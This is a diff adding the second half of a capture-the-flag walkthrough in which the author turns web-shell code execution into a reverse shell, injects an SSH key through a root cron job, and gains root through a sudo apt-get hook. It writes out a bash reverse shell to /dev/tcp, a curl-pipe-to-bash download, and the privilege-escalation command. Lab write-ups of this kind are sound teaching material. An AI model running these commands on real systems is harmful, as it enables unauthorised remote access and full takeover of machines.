@@ -134,5 +134,199 @@ Upon returning to our terminal, we see that we do indeed have RCE!
 ![](/images/validate_rce.png)
 
 Now, we will gain access to the machine.
-<!--more-->
 
+Now we will create an `index.html`, which in reality will not be HTML, but rather a bash script.
+
+![](/images/reverse_shell.png)
+
+```bash
+#!/usr/bin/bash
+bash -i >& /dev/tcp/IP/PORT 0>&1
+```
+Now we'll listen with nc
+
+![](/images/nc_listen.png)
+
+We will set up a server using Python 3 to share the index.html file.
+
+```bash
+sudo python3 -m http.server 80
+```
+
+We will do it this way to bypass any restrictions, in case the web shell has any.
+
+Now, in the web shell, we will use the following command:
+
+```bash
+curl http://IP | /bin/bash
+```
+
+![](/images/gaining_access.png)
+
+This will cause `curl` to send a web request to our server, retrieve the content of `index.html` (which is a Bash script), and then pipe it to `/bin/bash` for execution.
+
+We press Enter and...
+
+![](/images/shell_exec.png)
+
+Let’s go! We have access to the machine.
+
+Now we will configure the TTY; this will ensure that our connection is not interrupted when we use keyboard shortcuts.
+
+First, we will execute:
+
+```bash
+script /dev/null bash
+```
+![](/images/tty.png)
+
+Then CTRL + Z :
+
+![](/images/tty2.png)
+
+And in the terminal, we will type:
+
+```bash
+stty raw -echo; fg
+```
+
+![](/images/tty3.png)
+
+And to wrap things up, we will write:
+
+```bash
+reset xterm
+```
+
+![](/images/tty4.png)
+
+And finally:
+
+```bash
+bash
+export TERM=xterm
+export SHELL=/bin/bash
+```
+
+![](/images/tty_finally.png)
+
+Now that we’ve started looking for the `user.txt` flag, I found a user named `jake` in the `/home/` directory.
+
+![](/images/listing_home.png)
+
+Let's see if it has the user.txt file.
+
+![](/images/cat_user.png)
+
+Well, it seems we don’t have permission.
+
+At this point, I began analyzing whether any SUID files existed that could be exploited.
+
+But there was nothing interesting
+
+![](/images/suid.png)
+
+I began to list any open ports that might only be visible from within the machine.
+
+But nothing—there was nothing running, other than just the ports we had seen in the scan.
+
+![](/images/ports_find.png)
+
+Until it occurred to me to check if there were any cron jobs running
+
+![](/images/crontab.png)
+
+root was executing a task that involved what appeared to be an id_rsa.pub file in the /opt directory, and it was saving it directly to the jake user account.
+
+Then the idea occurred to me to inject our own public key.
+
+So I went to that folder to see what permissions we had.
+
+And yes, we have read and write permissions.
+
+![](/images/perm.png)
+
+So we create our own public key to inject it right there.
+
+![](/images/key_gen.png)
+
+Once we have created our key, we will copy the public key to inject it into the victim machine.
+
+![](/images/key_pub.png)
+
+We edit the file using nano.
+
+![](/images/resize.png)
+
+Don't be alarmed if your screen looks like this; we’ll exit nano quickly.
+
+And we head over to the terminal on our PC.
+
+And we write:
+
+```bash
+stty size
+```
+You need to enter these values ​​into the victim machine as follows (the specific values ​​will depend on your own setup).
+
+```bash
+stty row 52
+stty columns 186
+```
+
+![](/images/terminal.png)
+
+Now if you do nano again
+
+![](/images/nano.png)
+
+It should have the exact proportions now.
+
+How do we proceed? Now, we will replace this key with our own public key.
+
+Save and exit
+
+
+Now we will try to connect to the victim machine via SSH.
+
+![](/images/ssh_key.png)
+
+Now, use the key you created earlier in the following command:
+
+```bash
+ssh -i key jake@10.66.128.160
+```
+
+Press Enter, and we are now the user 'jake'.
+
+![](/images/jake.png)
+
+Now you can view the user.txt file and upload it to the page.
+
+Now the final step is to become root.
+
+By running `sudo -l`, we can see that we have permissions for this binary.
+
+![](/images/bin_suid.png)
+
+The binary states that we can execute it as any user, without a password.
+
+To exploit this binary, we can use the website <gtfobins.org>
+
+Here are the steps to take advantage of these privileges and gain root access.
+
+![](/images/gtfobins.png)
+
+We will execute this command:
+
+```console
+jake@smag:~$ sudo /usr/bin/apt-get update -o APT::Update::Pre-Invoke::=/bin/bash
+```
+
+![](/images/root.png)
+
+Congratulations! We are now root users; we can now view root.txt
+
+![](/images/root-final.png)
+
+<!--more-->
